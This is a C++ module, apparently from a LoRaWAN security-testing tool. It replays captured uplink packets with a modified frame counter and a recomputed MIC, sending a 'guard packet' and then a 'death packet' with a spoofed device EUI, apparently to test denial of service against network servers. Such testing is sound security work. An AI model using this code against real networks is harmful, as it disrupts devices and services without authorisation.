#include "bruteforcing_mic.h"

#include "Utils/common.h"
#include "Utils/jsonparser.h"

#include "Utils/logger.h"
#include <chrono>
#include <thread>

BruteforcingMIC::BruteforcingMIC()
{
//     auto startFactoring = std::chrono::high_resolution_clock::now();

//    for(unsigned long int i=1; i < 4294967295; i++)
//    {
//        micValues.emplace_back(Common::ulong2Bytes(i));
//    }

//    auto stop = std::chrono::high_resolution_clock::now();
//    auto duration = std::chrono::duration_cast<std::chrono::duration<int64_t, std::milli>>( stop - startFactoring ).count();
//    std::cout << "all MIC were generated in : " << duration  << " ms" << std::endl;

}

Lorawan_result BruteforcingMIC::launch()
{
    called(Logger::BruteforcingMIC);
    PacketStorage *storage = PacketStorage::getInstance();


    std::vector<std::shared_ptr<DataPacket> > macPayloads = storage->getMacPayloadPacket();

    if(macPayloads.size() > 0)
    {
        if(setUpSending(macPayloads.front()) != Lorawan_result::Success)
        {
            return Lorawan_result::ErrorTestSetUp;
        }

            std::shared_ptr<DataPacket> firstPayload = macPayloads.back();

            if(sendGuardPacket(firstPayload) != Lorawan_result::Success)
            {
                return Lorawan_result::ErrorTestSetUp;
            }

            if(sendDeathPacket(firstPayload) != Lorawan_result::Success)
            {
                return Lorawan_result::ErrorTest;
            }

    } else
    {
        writeLog(Logger::BruteforcingMIC | Logger::LorawanTest,"no payload packets");
        return Lorawan_result::ErrorTest;
    }

    writeLog(Logger::BruteforcingMIC, "Finished bruteforcing MIC test");

    return Lorawan_result::Success;
}

Lorawan_result BruteforcingMIC::sendGuardPacket( std::shared_ptr<DataPacket> dataPkt)
{
    std::string jsonToSend{};
    called(Logger::BruteforcingMIC);

    DataPacket copyPacket(dataPkt);
    unsigned long int ulCount = Common::bytes2ULong(copyPacket.getFrameCounter());

    ulCount += 1;

    copyPacket.setFrameCounter(Common::ulong2Bytes(ulCount));


    if(copyPacket.serialize() != Lorawan_result::Success) //updated rawPacket
        return Lorawan_result::ErrorSerialize;


    if(Common::calculateMIC(copyPacket) != Lorawan_result::Success)
    {
        return Lorawan_result::ErrorCalcMIC;
    }

    if(copyPacket.serialize() != Lorawan_result::Success)
        return Lorawan_result::ErrorSerialize;


    if(Common::createJsonToSend(copyPacket.getRawData(),copyPacket.getJsonString(),jsonToSend)
            != Lorawan_result::Success)
        return Lorawan_result::ErrorCreatingPacket;

    std::chrono::milliseconds timespan(5000);
    std::this_thread::sleep_for(timespan);

    Tins::IP refIP = dataPkt->getPacketIP();
    uplink.setIP(refIP);
    writeLog(Logger::BruteforcingMIC,"packet is based on IP with id = " + std::to_string(refIP.id()));
    writeLog(Logger::BruteforcingMIC,"sending guard packet with frame counter = " + std::to_string(Common::bytes2ULong(copyPacket.getFrameCounter())));

    if(send(copyPacket.getMagicFour(),testDevice->getEui64(), jsonToSend) != Lorawan_result::Success)
    {
        writeLog(Logger::BruteforcingMIC,"error sending guard packet!");
    }

    return Lorawan_result::Success;
}


Lorawan_result BruteforcingMIC::sendDeathPacket(std::shared_ptr<DataPacket> dataPkt)
{
    std::string jsonToSend{};
    called(Logger::BruteforcingMIC);
    DataPacket copyPacket(dataPkt);

//    unsigned long int dosCount = Common::bytes2ULong(copyPacket.getFrameCounter());

//    dosCount += 1;

//    copyPacket.setFrameCounter(Common::ulong2Bytes(dosCount));
//    std::cout << "changed value of FCnt: " << Common::bytes2HexStr(copyPacket.getFrameCounter()) << std::endl;

    if(copyPacket.serialize() != Lorawan_result::Success) //updated rawPacket
        return Lorawan_result::ErrorSerialize;

    if(Common::calculateMIC(copyPacket, true) != Lorawan_result::Success)
    {
        return Lorawan_result::ErrorCalcMIC;
    }

    if(copyPacket.serialize() != Lorawan_result::Success)
        return Lorawan_result::ErrorSerialize;


    if(Common::createJsonToSend(copyPacket.getRawData(),copyPacket.getJsonString(),jsonToSend)
            != Lorawan_result::Success)
        return Lorawan_result::ErrorCreatingPacket;

    std::chrono::milliseconds timespan(4000);
    std::this_thread::sleep_for(timespan);

    Tins::IP refIP = dataPkt->getPacketIP();
    uplink.setIP(refIP);
    writeLog(Logger::BruteforcingMIC,"packet is based on IP with id = " + std::to_string(refIP.id()));
    writeLog(Logger::BruteforcingMIC,"sending packet with frame counter = " + std::to_string(Common::bytes2ULong(copyPacket.getFrameCounter())));

    if(send(copyPacket.getMagicFour(),testDevice->getEui64(), jsonToSend) != Lorawan_result::Success)
    {
        writeLog(Logger::BruteforcingMIC,"error sending death packet!");
    }

    return Lorawan_result::Success;
}

Lorawan_result BruteforcingMIC::setUpSending(std::shared_ptr<LorawanPacket> packet)
{
    called(Logger::BruteforcingMIC);
    testDevice->setEui64(packet->getEui64());

    uplink.setDstPort(packet->getDstPort());
    uplink.setSrcPort(packet->getSrcPort());

    return Lorawan_result::Success;
}


Lorawan_result BruteforcingMIC::send(bytes magicFour, bytes eui64, std::string json)
{
    bytes rawData;
    called(Logger::BruteforcingMIC);
    bytes rawJson = Common::str2Bytes(json);

    rawData.insert(rawData.begin(),magicFour.begin(), magicFour.end());
    rawData.insert(rawData.end(),eui64.begin(), eui64.end());
    rawData.insert(rawData.end(),rawJson.begin(), rawJson.end());

    std::string dataToSend = Common::bytes2Str(rawData);

    writeLog(Logger::BruteforcingMIC, "data to send: \n" + dataToSend);

    return uplink.send(dataToSend);
}
